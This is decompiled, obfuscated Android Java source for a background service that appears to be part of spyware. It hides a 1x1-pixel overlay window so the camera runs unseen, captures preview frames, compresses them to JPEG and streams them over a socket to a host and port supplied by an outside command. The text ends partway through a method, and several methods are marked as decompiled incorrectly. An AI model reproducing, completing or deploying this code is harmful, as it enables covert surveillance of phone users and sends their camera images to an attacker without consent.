package com.appser;

import android.app.Service;
import android.content.Intent;
import android.hardware.Camera;
import android.os.Build;
import android.os.IBinder;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

public class futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 extends Service implements SurfaceHolder.Callback {
    public static Camera c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m;
    public static WindowManager.LayoutParams la_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_y;
    public static OutputStream o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut;
    public static SurfaceView s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw;
    public static Socket s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k;
    static futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 st;
    /* access modifiers changed from: private */
    public static Object syc = new Object();
    public static WindowManager w_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m;
    public boolean Lo = false;
    /* access modifiers changed from: private */
    public List<byte[]> b_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ts = new ArrayList();
    public boolean ctd = false;
    /* access modifiers changed from: private */
    public int q4 = 50;
    public boolean usd = false;
    /* access modifiers changed from: private */
    public String[] vul;

    /* access modifiers changed from: private */
    public int q(int i, int i2) {
        if (i > 61440) {
            return 15;
        }
        if (i > 51200) {
            return 25;
        }
        if (i > 40960) {
            return 35;
        }
        if (i > 30720) {
            return 45;
        }
        if (i > 20480) {
            return 65;
        }
        if (i > 10240) {
            return 75;
        }
        return i2;
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    public int onStartCommand(Intent intent, int i, int i2) {
        Intent intent2 = intent;
        try {
            sendBroadcast(new Intent(getApplicationContext(), CamActivity.class).setAction("xyz"));
            String str = considerablesjoinednintensivenestateadocumentedlcourageqcriminalhnasdaqjcarryingbreservationsl9.FTX1;
            if (intent2 != null && intent2.hasExtra(str)) {
                if (!safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.NeedSuper() || advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32wm == null || advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32lay == null) {
                    this.vul = intent2.getStringArrayExtra(str);
                    boolean c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k();
                    this.usd = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k;
                    if (!c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k) {
                        w_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m = (WindowManager) getSystemService("window");
                        s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw = new SurfaceView(this);
                        if (Build.VERSION.SDK_INT >= 26) {
                            la_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_y = new WindowManager.LayoutParams(1, 1, 2038, 56, -3);
                        } else {
                            la_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_y = new WindowManager.LayoutParams(1, 1, 2006, 262144, -3);
                        }
                        la_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_y.gravity = 51;
                        w_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m.addView(s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw, la_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_y);
                        s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw.getHolder().addCallback(this);
                        Completed_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_App(this.vul[1], Integer.valueOf(this.vul[2]).intValue());
                    } else {
                        sp();
                    }
                } else {
                    this.vul = intent2.getStringArrayExtra(str);
                    boolean c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k2 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k();
                    this.usd = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k2;
                    if (!c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k2) {
                        s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw = new SurfaceView(this);
                        advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32lay.gravity = 51;
                        advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32wm.addView(s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw, advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32lay);
                        s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw.getHolder().addCallback(this);
                        Completed_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_App(this.vul[1], Integer.valueOf(this.vul[2]).intValue());
                    } else {
                        sp();
                    }
                }
            }
            return 1;
        } catch (Exception unused) {
            return 2;
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:6:0x000d, code lost:
        return true;
     */
    /* JADX WARNING: Exception block dominator not found, dom blocks: [] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public boolean c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k() {
        /*
            r1 = this;
            android.hardware.Camera r0 = android.hardware.Camera.open()     // Catch:{ RuntimeException -> 0x000d, all -> 0x000b }
            if (r0 == 0) goto L_0x0009
            r0.release()
        L_0x0009:
            r0 = 0
            return r0
        L_0x000b:
            r0 = move-exception
            throw r0
        L_0x000d:
            r0 = 1
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k():boolean");
    }

    public void Completed_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_App(final String str, final int i) {
        new Thread(new Runnable() {
            public void run() {
                int i = 0;
                do {
                    if (i >= 3) {
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.sp();
                    }
                    try {
                        InetSocketAddress inetSocketAddress = new InetSocketAddress(InetAddress.getByName(str), i);
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k = new Socket();
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.setSoTimeout(0);
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.setKeepAlive(true);
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.setTcpNoDelay(true);
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.connect(inetSocketAddress, 60000);
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.ctd = futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.isConnected();
                        if (futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.ctd) {
                            futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut = futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k.getOutputStream();
                            futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.Lo = true;
                            futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.p_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_r();
                            return;
                        }
                    } catch (UnknownHostException unused) {
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.di();
                    } catch (SocketException unused2) {
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.di();
                    } catch (Exception unused3) {
                        futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.di();
                    }
                    try {
                        Thread.sleep(1);
                    } catch (InterruptedException unused4) {
                    }
                    i++;
                } while (!futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.ctd);
            }
        }).start();
    }

    /* access modifiers changed from: private */
    /* JADX WARNING: Can't wrap try/catch for region: R(12:0|1|2|3|4|5|6|7|8|(2:9|10)|12|(4:14|15|16|18)(1:19)) */
    /* JADX WARNING: Can't wrap try/catch for region: R(13:0|1|2|3|4|5|6|7|8|9|10|12|(4:14|15|16|18)(1:19)) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x000a */
    /* JADX WARNING: Missing exception handler attribute for start block: B:5:0x000f */
    /* JADX WARNING: Missing exception handler attribute for start block: B:7:0x0018 */
    /* JADX WARNING: Missing exception handler attribute for start block: B:9:0x0021 */
    /* JADX WARNING: Removed duplicated region for block: B:14:0x002c A[SYNTHETIC, Splitter:B:14:0x002c] */
    /* JADX WARNING: Removed duplicated region for block: B:19:? A[RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void di() {
        /*
            r1 = this;
            r0 = 0
            r1.Lo = r0
            com.appser.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31.F_advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex31_ORCA = r0
            java.net.Socket r0 = s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ IOException | SocketException -> 0x000a }
            r0.shutdownOutput()     // Catch:{ IOException | SocketException -> 0x000a }
        L_0x000a:
            java.net.Socket r0 = s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ IOException | SocketException -> 0x000f }
            r0.shutdownInput()     // Catch:{ IOException | SocketException -> 0x000f }
        L_0x000f:
            java.net.Socket r0 = s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ IOException | SocketException -> 0x0018 }
            java.io.OutputStream r0 = r0.getOutputStream()     // Catch:{ IOException | SocketException -> 0x0018 }
            r0.close()     // Catch:{ IOException | SocketException -> 0x0018 }
        L_0x0018:
            java.net.Socket r0 = s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ IOException | SocketException -> 0x0021 }
            java.io.InputStream r0 = r0.getInputStream()     // Catch:{ IOException | SocketException -> 0x0021 }
            r0.close()     // Catch:{ IOException | SocketException -> 0x0021 }
        L_0x0021:
            java.net.Socket r0 = s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ IOException | SocketException -> 0x0027 }
            r0.close()     // Catch:{ IOException | SocketException -> 0x0027 }
            goto L_0x0028
        L_0x0027:
        L_0x0028:
            java.io.OutputStream r0 = o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut
            if (r0 == 0) goto L_0x0032
            r0.close()     // Catch:{ IOException | SocketException -> 0x002f }
        L_0x002f:
            r0 = 0
            o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut = r0
        L_0x0032:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.di():void");
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(11:0|1|2|3|4|(3:6|(4:9|(2:13|27)|23|7)|24)|(1:15)|16|(1:20)|21|28) */
    /* JADX WARNING: Code restructure failed: missing block: B:29:?, code lost:
        return;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:3:0x0015 */
    /* JADX WARNING: Removed duplicated region for block: B:15:0x0052 A[Catch:{ Exception -> 0x0092 }] */
    /* JADX WARNING: Removed duplicated region for block: B:6:0x0028 A[Catch:{ Exception -> 0x0092 }] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void surfaceCreated(android.view.SurfaceHolder r8) {
        /*
            r7 = this;
            java.lang.String r0 = "continuous-video"
            java.lang.String[] r1 = r7.vul     // Catch:{ RuntimeException -> 0x0015 }
            r2 = 0
            r1 = r1[r2]     // Catch:{ RuntimeException -> 0x0015 }
            java.lang.Integer r1 = java.lang.Integer.valueOf(r1)     // Catch:{ RuntimeException -> 0x0015 }
            int r1 = r1.intValue()     // Catch:{ RuntimeException -> 0x0015 }
            android.hardware.Camera r1 = android.hardware.Camera.open(r1)     // Catch:{ RuntimeException -> 0x0015 }
            c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m = r1     // Catch:{ RuntimeException -> 0x0015 }
        L_0x0015:
            android.hardware.Camera r1 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera$Parameters r1 = r1.getParameters()     // Catch:{ Exception -> 0x0092 }
            r2 = 0
            android.hardware.Camera r3 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera$Parameters r3 = r3.getParameters()     // Catch:{ Exception -> 0x0092 }
            java.util.List r3 = r3.getSupportedPreviewSizes()     // Catch:{ Exception -> 0x0092 }
            if (r3 == 0) goto L_0x0050
            android.hardware.Camera r3 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera$Parameters r3 = r3.getParameters()     // Catch:{ Exception -> 0x0092 }
            java.util.List r3 = r3.getSupportedPreviewSizes()     // Catch:{ Exception -> 0x0092 }
            java.util.Iterator r3 = r3.iterator()     // Catch:{ Exception -> 0x0092 }
        L_0x0036:
            boolean r4 = r3.hasNext()     // Catch:{ Exception -> 0x0092 }
            if (r4 == 0) goto L_0x0050
            java.lang.Object r4 = r3.next()     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera$Size r4 = (android.hardware.Camera.Size) r4     // Catch:{ Exception -> 0x0092 }
            int r5 = r4.width     // Catch:{ Exception -> 0x0092 }
            r6 = 600(0x258, float:8.41E-43)
            if (r5 <= r6) goto L_0x0036
            int r5 = r4.height     // Catch:{ Exception -> 0x0092 }
            r6 = 400(0x190, float:5.6E-43)
            if (r5 <= r6) goto L_0x0036
            r2 = r4
            goto L_0x0036
        L_0x0050:
            if (r2 != 0) goto L_0x005a
            r3 = 640(0x280, float:8.97E-43)
            r2.width = r3     // Catch:{ Exception -> 0x0092 }
            r3 = 480(0x1e0, float:6.73E-43)
            r2.height = r3     // Catch:{ Exception -> 0x0092 }
        L_0x005a:
            java.lang.String[] r3 = r7.vul     // Catch:{ Exception -> 0x0092 }
            r4 = 4
            r3 = r3[r4]     // Catch:{ Exception -> 0x0092 }
            java.lang.Integer r3 = java.lang.Integer.valueOf(r3)     // Catch:{ Exception -> 0x0092 }
            int r3 = r3.intValue()     // Catch:{ Exception -> 0x0092 }
            r4 = 1
            if (r3 != r4) goto L_0x0077
            java.util.List r3 = r1.getSupportedFocusModes()     // Catch:{ Exception -> 0x0092 }
            boolean r3 = r3.contains(r0)     // Catch:{ Exception -> 0x0092 }
            if (r3 == 0) goto L_0x0077
            r1.setFocusMode(r0)     // Catch:{ Exception -> 0x0092 }
        L_0x0077:
            int r0 = r2.width     // Catch:{ Exception -> 0x0092 }
            int r2 = r2.height     // Catch:{ Exception -> 0x0092 }
            r1.setPreviewSize(r0, r2)     // Catch:{ Exception -> 0x0092 }
            r0 = 17
            r1.setPreviewFormat(r0)     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera r0 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            r0.setParameters(r1)     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera r0 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            r0.setPreviewDisplay(r8)     // Catch:{ Exception -> 0x0092 }
            android.hardware.Camera r8 = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ Exception -> 0x0092 }
            r8.startPreview()     // Catch:{ Exception -> 0x0092 }
        L_0x0092:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.surfaceCreated(android.view.SurfaceHolder):void");
    }

    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i2, int i3) {
        Camera camera = c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m;
        if (camera != null) {
            camera.setPreviewCallback(new Camera.PreviewCallback() {
                public void onPreviewFrame(byte[] bArr, Camera camera) {
                    if (bArr != null) {
                        try {
                            if (futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k != null && futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.ctd && futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut != null) {
                                synchronized (futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.syc) {
                                    futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this.b_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ts.add(bArr);
                                }
                            }
                        } catch (Exception | OutOfMemoryError unused) {
                        }
                    }
                }
            });
        }
    }

    public void p_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_r() {
        new Thread(new Runnable() {
            /* JADX WARNING: Can't wrap try/catch for region: R(15:25|27|28|(1:30)|31|32|33|34|35|36|37|39|40|45|43) */
            /* JADX WARNING: Missing exception handler attribute for start block: B:34:0x00df */
            /* JADX WARNING: Removed duplicated region for block: B:38:? A[ExcHandler: OutOfMemoryError (unused java.lang.OutOfMemoryError), SYNTHETIC, Splitter:B:27:0x004f] */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /*
                    r12 = this;
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r0 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this
                    java.lang.String[] r0 = r0.vul
                    r1 = 5
                    r0 = r0[r1]
                    java.lang.Integer r0 = java.lang.Integer.valueOf(r0)
                    int r0 = r0.intValue()
                L_0x0011:
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this
                    boolean r1 = r1.Lo
                    if (r1 == 0) goto L_0x00f1
                    r1 = 0
                    r2 = 0
                    java.lang.Object r3 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.syc     // Catch:{ Exception -> 0x004e }
                    monitor-enter(r3)     // Catch:{ Exception -> 0x004e }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ all -> 0x0044 }
                    java.util.List r4 = r4.b_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ts     // Catch:{ all -> 0x0044 }
                    int r4 = r4.size()     // Catch:{ all -> 0x0044 }
                    if (r4 <= 0) goto L_0x0042
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ all -> 0x0044 }
                    java.util.List r4 = r4.b_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ts     // Catch:{ all -> 0x0044 }
                    java.lang.Object r4 = r4.get(r2)     // Catch:{ all -> 0x0044 }
                    byte[] r4 = (byte[]) r4     // Catch:{ all -> 0x0044 }
                    byte[] r4 = (byte[]) r4     // Catch:{ all -> 0x0044 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ all -> 0x004c }
                    java.util.List r1 = r1.b_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ts     // Catch:{ all -> 0x004c }
                    r1.remove(r2)     // Catch:{ all -> 0x004c }
                    r1 = r4
                L_0x0042:
                    monitor-exit(r3)     // Catch:{ all -> 0x0044 }
                    goto L_0x004e
                L_0x0044:
                    r4 = move-exception
                    r11 = r4
                    r4 = r1
                    r1 = r11
                L_0x0048:
                    monitor-exit(r3)     // Catch:{ all -> 0x004c }
                    throw r1     // Catch:{ Exception -> 0x004a }
                L_0x004a:
                    r1 = r4
                    goto L_0x004e
                L_0x004c:
                    r1 = move-exception
                    goto L_0x0048
                L_0x004e:
                    r4 = r1
                    android.hardware.Camera r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    android.hardware.Camera$Parameters r1 = r1.getParameters()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    android.hardware.Camera$Size r3 = r1.getPreviewSize()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    int r9 = r3.width     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    android.hardware.Camera$Size r1 = r1.getPreviewSize()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    int r1 = r1.height     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    android.graphics.YuvImage r10 = new android.graphics.YuvImage     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r5 = 17
                    r8 = 0
                    r3 = r10
                    r6 = r9
                    r7 = r1
                    r3.<init>(r4, r5, r6, r7, r8)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.io.ByteArrayOutputStream r3 = new java.io.ByteArrayOutputStream     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r3.<init>()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    android.graphics.Rect r4 = new android.graphics.Rect     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r4.<init>(r2, r2, r9, r1)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    int r1 = r1.q4     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r10.compressToJpeg(r4, r1, r3)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    if (r0 == 0) goto L_0x0093
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    byte[] r5 = r3.toByteArray()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    int r5 = r5.length     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r6 = 75
                    int r4 = r4.q(r5, r6)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    int unused = r1.q4 = r4     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                L_0x0093:
                    java.lang.StringBuilder r1 = new java.lang.StringBuilder     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r1.<init>()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.lang.String[] r4 = r4.vul     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r5 = 3
                    r4 = r4[r5]     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r1.append(r4)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.lang.String[] r4 = r4.vul     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r5 = 6
                    r4 = r4[r5]     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
